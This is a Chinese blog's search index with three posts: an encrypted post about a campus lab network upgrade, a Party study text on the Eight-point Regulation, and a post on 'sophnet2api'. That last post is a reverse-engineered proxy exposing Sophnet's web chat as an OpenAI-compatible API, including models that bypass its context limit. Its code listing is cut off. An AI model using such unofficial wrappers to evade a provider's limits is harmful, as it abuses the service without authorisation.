<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>西北大学现代学院机房升级改造</title>
      <link href="/posts/886c.html"/>
      <url>/posts/886c.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="65afa1d8c7e3c768b5d143a7052e7cd812f8b82fe81290f3406a2c241d781f96">a43f6b9988103671f5bc4e06177506b708aa72886787cd9909cf247d3f545d830dee0c1a5c2e5086b213984989019ef51faa75915a2457ae89308558de13d6c60b022a05a0a7bfbfeca19ad2d3bda7520c4f19f02165b13ea73e200a7e24f39ff589e059eb4f82e150a65aa44870154c551bbe2daa8ad7249589e08805ce17e438f1a451f090783fb25c9e1f3f0ecada24e62fb46ff3a1a6c64355b7bfd4e232c7b5b45d3c2ce6eeceeaad008538b952ff69fcc84885eb732fdf193380e57234ebe5baade9e2a25a4396330d33acaa0b085c73956775241840dfbe0490dd322f5615eac2496727552528359d0c0fff134850fe6bdfaf5277486d58b2ac33dd95337b0e8ec1946ec2076f9bdb0f15cd50c3151d3cdb523b2233fe71fac11b1e4fb79e94fe25da8c9336c11fae69ea9a46f6e8e79074f30ce1ab2abb4f7f571c6e9df6f8965709527159d430f33c148b3a1a248981058eb248074a63405359f533139e95c1c73ce154e2755d38d8dd197e488049e788f4439daa48e1dc88d3d070b57ce676b2ed8b7f7f456f4e5b715802edbd886d44c65032656fc1e7127e3f56b245b6fedaa09a262c154e60a9beba698dc95db3d41e7fd0997f67f2ce2d6b3deb7e4a81346b0362b423dd4a2be1ecc47dc1064ea9c40843636be2324d244880e8384feae93ec10bb59377dd9d8f517e8763929e98aec036fca777032b63d46f43b48736a38eb68bdd300ab4bf0440cd69ff93f3f82596a4b78aff9905e178a308e7ceec0dabb5cc8981aff4c1444c2c5f56b56bd26bb64769248e950756d955ee9a95f6faed206e7f144b4e23ec0694d297c07f3ed6b5ff31050bafafb5ef10c311e02d22eab25b22cdd12532261d8dcf67ab8f880116b701e269be2173019e2191cba3052f91fa8ebe2e0b92cd0289957ccf1585fde372c6f76fa2bdb51c6c0ee25425878a2dd9d19896b280c651b0ce9e2b10dd976d352fa845074d2ab184aa0aba21a8017c96db162e5217bae0acc189a79061c856f8bb57f80762307c31c28dff5635af5aeeffbf82132c033571881c8d5cdfa5a5816916a1bb7d216c733214bec2cb664369b5c32815c2345c0bfab2d9d103d744ec7327c4c7069e92d99a872fe80e0993ecae73002629032295e23e566d42a7029be94a60f404ebf992cd78abcd7b0a27c8b21bc93058b82934d3666d53f33ebc81e7ad47d39272a404322365062e293d21ec21671e84b5f751bb910aca3812e5f8257af47eafe7b4b4f398ef417b0515ed3cc056dad0ba0f72656bde4c73ab8309693a667bc01754c7d78c4dde14583df1848bbc933349d7ff3a0e907f8c073b768ec2181911bed6b439ca5c01aa97d978d3720bdc29d1d0fa9f7996dc914a7e61ff383ce19b94dc6b0e9c6a737851b4d852480337cbe34ef2194caa2cfd0d73bfa81b191d34fc36ec1a8e0f6f881c445b741018ff1875d62ec8b4ae5cd9a283e501512b99f1c16426e0bc217183dca9345d819459df4c56c08c8b101df36e8156e75ce654a7e5f90b5c8f689e78ee79752e85072dc2f07864d0a1383f5bd5b8c5d1b0bb49afe2fd2bdaa9098af5a54da9b63be07469cc83dc2a62eaf30ce518cb3ca7e200fc3e2f220ef86d6f7b8ce291936968f3f9a692f5e7e577ef477670ecc5173a77770cb65455ea26ab8f0626123eb23ff647b14d7152296d20612e76f70db21641231f6a35b6d0289e7d68863a617ec0156602fcdba0bb80d441389e950c05bd8bed01e6f8c5b7c6eb1686e42d8a79c2660cfe0cfe5900643d9692ff8e58a0dba85c571f059d9620104be61c8cd1bcba2b0659258cae26970c5f1f6de337e5523b5a6496d98ea1362abf69506dfa79e78fbc02ccee19abd7718c2aa9d5cc0d348c9fc2d09da49c656e43ead96b55d3f3511fc19f327bcbae877269929d1eefa35c645c884ee354eee89d189367c3ce926accfc4f84b4a1ed997c38e71a01f8382913eee81123dec7a328bd759359b2ee5ebc830add4a160411814a556fb105a7911f8d6de4454ded1275e52428d4778508fee5d28b6820837bc953ee949ae973fd92f321be50f007b529e6bf8b3714da3bfeb8545a6f005cf3f9f8e0274bfd0d096ac81069c73bfd73f4eccea06e8375fc700e52f9384e14f9534381a4b131e2553ac21a09ced809dfae577406278f1c24a3f3a92066162bdb08b654ca27a5d05b4727b59301402ac62340642a278d213382f6c4febfaacf9d83fb92e285c71e55ee08af0e52f9b6f56cf481507d7262ab66f5aba112eaa6d61a73008c674f1014ceaa734fc797683af781b64117deeb8af2bffde5fe1c5ef2f753f310d4409fe2d8e12659e6585304a3443c7382be25fdac3cbabcbbe940493fe4264becd9ceaf4d0ab1a2ba8c7f89b5a71f1ddd7d854d85dcadebd351ffaf76fa46e2d81cfa702f7af4e2d1aa7167348fae1c3f91750fe318c55d5f23f34d409f25542f1dd73eb354b5b4ba5888c490d47543f9b2c86e10f957cc380596ddb34b954f7fc0306a7e2b40d37ff673396084ef1b695fcfaa16e3651f99c07568dfddb8b03b2e8bcecf57e0692c73efb46f9a018cdf5607cab343d059444a7a534b48de26d73c9e51a7c6f5aae45e010d60a77a349d7adb774407cfaba316d22c5eea628369ad7ab2873e42f0d181c02f57fde4ebf8723a24eb16368b6a99339863330d4ee1ca2152f99ba9cb03e728de41e13cf9fbaf99b80562e903ea84268bafff2c13bc64091253b268c36b28312421ccbcc5d9a82669e98c3fa0f33189626ae0a4475db1beee95c490015fe2eed4cc317df7d4561ff790a2d0dbfdd5b4154773aecd18a7f15814e241841a0bf8cce6c8f5fe38d94e156f8deccceee1502ef2d400af34d6364fa23857e1db1169fa2fb2399a990cfb9ef8cd4759933b001e54ef8bf85903a065c2a1b5673cee49bd72a22bc96fc3d26610bc12705ad711ec1b2c4caa979092e5c4221a6e270895c934831db17b5c3c159fec7cbfb6430c85373a571a08987aae53e7d5b979705024947ac81e7b7c6715b0a0eafbe07c80ce45e1a66a36313180e81b81a0a919d1b56620652e0d6b407619dfd8b082fb965ff517b5ca8209ed99a3318e7eaf8cbf88a325a8743c8e4a2439afb8ae40c4413acbaea6180ce8d4245dc049153fbff2b3e0a456ab4a349552c153cd7619e3730166f505c8cee0757388288fa9122ddc52f3d8df21899cc7f2b944d5f098198c11debec071fd77c11089ad3536cb213d93d27bb7c243149802e84c5a14c4abc21fcaa73c744762c1af5a26745eaa5a07737528dd9468e4d7efd1257761d2466c60e21addb52874c035fd3186786474ec28e8edb96f428b7f03dcf59c48a694927d03ccf1239af6309460c1bce6c156283021692ef014a6e70eac117751579e4737cea15d45d0e8142ff4c091aa9b3c5d6d8875fa56b9aeee7082cb9a84f208fe4207e51713fccce14af5f4f10f6e03110fb163bc9c0823777fd35e29787b9558f61b3c4a2bbbc573e4d07c7a1c61182a893208784223ebe39af570c99642d4fe36ccd7edf01c14068d135d7fd3fe228276a60e4a0d0441ca7b5f963c31e81dea8642b58296e575f674d07010705a240adc3bef920753facc28163d370df56683fa88ef5eaef80c8c4b72977ea8</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 工作记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 升级改造 </tag>
            
            <tag> 路由交换 </tag>
            
            <tag> 网络技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>八项规定精神学习</title>
      <link href="/posts/f5a4.html"/>
      <url>/posts/f5a4.html</url>
      
        <content type="html"><![CDATA[<p>来源 <a href="https://www.12371.cn/2025/03/31/ARTI1743412261487795.shtml">学习资料 | 中央八项规定和中央八项规定精神</a><br><a href="http://cpc.people.com.cn/GB/67481/460324/index.html"><strong>引用</strong></a></p><h2 id="基本内涵"><a href="#基本内涵" class="headerlink" title="基本内涵"></a>基本内涵</h2><h4 id="第一，坚持学查改一体推进。"><a href="#第一，坚持学查改一体推进。" class="headerlink" title="第一，坚持学查改一体推进。"></a>第一，坚持学查改一体推进。</h4><p>风化俗成需要时间，落实中央八项规定精神是一场攻坚战、持久战，此次学习教育强调把学和做结合起来、把查和改贯通起来、把破和立统一起来，提升教育效果，以短平快方式确保学有质量、查有力度、改有成效。   </p><h4 id="第二，坚持开门教育，自觉接受群众监督评判。"><a href="#第二，坚持开门教育，自觉接受群众监督评判。" class="headerlink" title="第二，坚持开门教育，自觉接受群众监督评判。"></a>第二，坚持开门教育，自觉接受群众监督评判。</h4><p>此次学习教育明确强调坚持开门教育，要自觉接受群众监督，要通过多种方式征求群众意见，让群众参与评价学习教育成效，作风建设的实效要让群众可感可及。  </p><h4 id="第三，坚持重点聚焦。"><a href="#第三，坚持重点聚焦。" class="headerlink" title="第三，坚持重点聚焦。"></a>第三，坚持重点聚焦。</h4><p>作风问题具有反复性和顽固性，具有长期性和复杂性，容易反弹回潮，容易变异隐形。此次学习教育强调充分运用纪检监察、巡视巡察、审计监督、财会监督、督促检查调研、信访反映等途径，开展以案说法、以案说纪、以案说责，结合实际剖析反面典型案例，集中整治群众反映强烈的11个方面的突出问题。  </p><h4 id="第四，坚持抓好“关键少数”。"><a href="#第四，坚持抓好“关键少数”。" class="headerlink" title="第四，坚持抓好“关键少数”。"></a>第四，坚持抓好“关键少数”。</h4><p>领导机关是国家治理体系中的重要机关，领导干部是党和国家事业发展的主力军，是党和国家事业发展的“关键少数”，对全党全社会都具有风向标作用。此次学习教育强调突出抓好新提拔干部、年轻干部、关键岗位干部的学习教育，强调了“关键少数”的示范引领、以上率下的带头作用。  </p><h4 id="第五，强调将学习教育与推动中心工作结合起来。"><a href="#第五，强调将学习教育与推动中心工作结合起来。" class="headerlink" title="第五，强调将学习教育与推动中心工作结合起来。"></a>第五，强调将学习教育与推动中心工作结合起来。</h4><p>把开展学习教育同贯彻落实党中央重大决策部署结合起来，同深入推进党风廉政建设和反腐败斗争结合起来，同整治形式主义为基层减负结合起来，组织党员、干部立足岗位，在推动高质量发展中加强基层治理，在完成急难险重任务中担当作为、服务群众。  </p><h2 id="重要意义"><a href="#重要意义" class="headerlink" title="重要意义"></a>重要意义</h2><p>深入贯彻中央八项规定精神学习教育，在以中国式现代化全面推进强国建设、民族复兴伟业，外部环境更趋复杂严峻的时代背景下，宣示作风建设永远在路上，对于推进中国式现代化具有重要而深远的意义。</p><h4 id="（一）开展深入贯彻中央八项规定精神学习教育，是巩固深化主题教育和党纪学习教育、纵深推进全面从严治党的重要举措。"><a href="#（一）开展深入贯彻中央八项规定精神学习教育，是巩固深化主题教育和党纪学习教育、纵深推进全面从严治党的重要举措。" class="headerlink" title="（一）开展深入贯彻中央八项规定精神学习教育，是巩固深化主题教育和党纪学习教育、纵深推进全面从严治党的重要举措。"></a>（一）开展深入贯彻中央八项规定精神学习教育，是巩固深化主题教育和党纪学习教育、纵深推进全面从严治党的重要举措。</h4><p>进入新时代，党中央每次开展集中教育，习近平总书记都对改进工作作风、密切联系群众提出明确要求。这次开展深入贯彻中央八项规定精神学习教育，是学习贯彻习近平新时代中国特色社会主义思想主题教育和党纪学习教育的续篇，是驰而不息加强作风建设、纵深推进全面从严治党的重要举措。  </p><h4 id="（二）开展深入贯彻中央八项规定精神学习教育，是密切党群干群关系、巩固党的执政基础的必然要求。"><a href="#（二）开展深入贯彻中央八项规定精神学习教育，是密切党群干群关系、巩固党的执政基础的必然要求。" class="headerlink" title="（二）开展深入贯彻中央八项规定精神学习教育，是密切党群干群关系、巩固党的执政基础的必然要求。"></a>（二）开展深入贯彻中央八项规定精神学习教育，是密切党群干群关系、巩固党的执政基础的必然要求。</h4><p>要聚焦这次学习教育的主题，把深入贯彻中央八项规定精神学习教育作为进一步密切党群干群关系、巩固党的执政基础的重要抓手，加强马克思主义群众观教育，坚持以习近平新时代中国特色社会主义思想凝心聚魂，坚持人民至上，坚持以人民为中心的发展思想，教育引导广大党员、干部牢记共产党是什么、要干什么的根本问题，践行新时代党的群众路线，坚持发展为了人民、发展依靠人民、发展成果由人民共享，把为民办事、为民造福作为最重要的政绩，始终保持共产党人的政治本色，确保党始终同人民同呼吸、共命运、心连心，以作风建设新成效推动保持党的先进性纯洁性、不断赢得人民群众信任拥护，确保党始终成为团结带领人民以中国式现代化全面推进强国建设、民族复兴伟业的坚强领导核心。</p><h4 id="（三）开展深入贯彻中央八项规定精神学习教育，是推进中国式现代化的有力保障。"><a href="#（三）开展深入贯彻中央八项规定精神学习教育，是推进中国式现代化的有力保障。" class="headerlink" title="（三）开展深入贯彻中央八项规定精神学习教育，是推进中国式现代化的有力保障。"></a>（三）开展深入贯彻中央八项规定精神学习教育，是推进中国式现代化的有力保障。</h4><p>党的二十大擘画了全面建设社会主义现代化国家、实现中华民族伟大复兴的宏伟蓝图，确立了以中国式现代化全面推进强国建设、民族复兴伟业的中心任务。党的二十届三中全会对进一步全面深化改革、推进中国式现代化作出部署，吹响了进一步全面深化改革的号角。党领导的伟大社会革命迈上新征程，对党的自我革命提出新的更高要求。我们党要担负起团结带领人民推进中国式现代化的历史责任，必须更加自觉地纵深推进全面从严治党和加强党的作风建设，把党锻造得更加坚强有力。</p><p><img src= "" data-lazy-src="https://img.skyk.us.kg/file/1747134815198_zybxgdtj.jpg" alt="图解"></p>]]></content>
      
      
      <categories>
          
          <category> 党务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 八项规定精神 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向API实现AI chat自由</title>
      <link href="/posts/d802.html"/>
      <url>/posts/d802.html</url>
      
        <content type="html"><![CDATA[<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><h2 id="以下api以及ai模型和2api技术仅适用于学习，如需api服务的可直接在留言板或页面底部留言窗口留言，部分模型完全免费。"><a href="#以下api以及ai模型和2api技术仅适用于学习，如需api服务的可直接在留言板或页面底部留言窗口留言，部分模型完全免费。" class="headerlink" title="以下api以及ai模型和2api技术仅适用于学习，如需api服务的可直接在留言板或页面底部留言窗口留言，部分模型完全免费。"></a>以下api以及ai模型和2api技术仅适用于学习，如需api服务的可直接在留言板或页面底部留言窗口留言，部分模型完全免费。</h2><h2 id="使用AI请遵守国家法律法规，详情请前往清朗·整治AI技术滥用了解"><a href="#使用AI请遵守国家法律法规，详情请前往清朗·整治AI技术滥用了解" class="headerlink" title="使用AI请遵守国家法律法规，详情请前往清朗·整治AI技术滥用了解"></a>使用AI请遵守国家法律法规，详情请前往<a href="https://newapi.112426.xyz/about">清朗·整治AI技术滥用</a>了解</h2><h1 id="一、sophnet2api"><a href="#一、sophnet2api" class="headerlink" title="一、sophnet2api"></a>一、sophnet2api</h1><hr><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>源</strong></td><td><a href="https://www.sophnet.com/#/playground/chat">https://www.sophnet.com/#/playground/chat</a></td></tr><tr><td><strong>正在维护</strong></td><td>✅</td></tr><tr><td><strong>当前版本</strong></td><td>2.2.1 Beta</td></tr><tr><td><strong>Demo</strong></td><td><a href="https://warm-squirrel-74.deno.dev/">https://warm-squirrel-74.deno.dev</a></td></tr><tr><td><strong>语言</strong></td><td>TypeScript</td></tr><tr><td><strong>框架</strong></td><td>Deno</td></tr></tbody></table><h2 id="Models"><a href="#Models" class="headerlink" title="Models"></a>Models</h2><ul><li>Qwen千问全系列</li></ul><p><a href="https://if.be-a.dev/">https://if.be-a.dev/</a></p><h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><ul><li>&#x2F;v1 下的 OpenAI 兼容 API, 支持聊天补全与模型获取.</li><li>-Search 后缀模型是带有联网搜索</li><li>-Full-Context 后缀模型是绕过了 10 条上下文限制</li></ul><h3 id="1、部署"><a href="#1、部署" class="headerlink" title="1、部署"></a>1、部署</h3><p>前往<a href="https://dash.deno.com/account/overview">Deno</a>创建XXX.ts</p><details><summary>sophnet2api.ts</summary><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span 